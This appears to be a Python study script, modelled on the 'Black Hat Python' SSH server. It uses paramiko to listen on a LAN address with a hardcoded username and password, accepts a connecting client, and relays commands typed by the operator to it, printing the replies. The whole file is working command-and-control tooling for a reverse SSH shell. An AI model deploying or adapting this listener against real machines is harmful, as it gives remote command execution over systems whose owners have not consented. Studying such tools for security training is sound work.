import os
import socket
import sys
import threading

import paramiko

# https://developer.51cto.com/article/604700.html parakim 详解
CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'centyuan') and (password == 'centyuan'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = '192.168.9.99'
    ssh_port = 222
    ip_host = (server,ssh_port)
    client = ''
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(ip_host)         # 绑定端口
        sock.listen(100)                    # 等待客户端连接
        print("[+] Listening for connection ...")
        client, addr = sock.accept()        # 返回connect对象
    except Exception as e:
        print("[-] Listen failed :" + str(e))
        sys.exit(1)
    # 沒有出现异常 finally：不管有没有异常，都会执行的语句。
    else:
        print("[+] Got a connection!", client, addr)
        bhSession = paramiko.Transport(client)  # 设置SSH连接的远程主机地址和端口
        bhSession.add_server_key(HOSTKEY)
        server = Server()
        bhSession.start_server(server=server)   # start_server()开始会话。
        chan = bhSession.accept(20)
        if chan is None:
            print("**** No channel.")
            sys.exit(1)
        print("[+] Authenticated!")
        print(chan.recv(1024))                  # 接受客户端信息
        try:
            while True:
                command = input("Enter command:")
                if command !="exit":
                    chan.send(command)          # 发送消息
                    r = chan.recv(8192)
                    print(r.decode())
                else:
                    chan.send("exit")
                    print('exiting')
                    bhSession.close()
                    break
        except KeyboardInterrupt:
            bhSession.close()


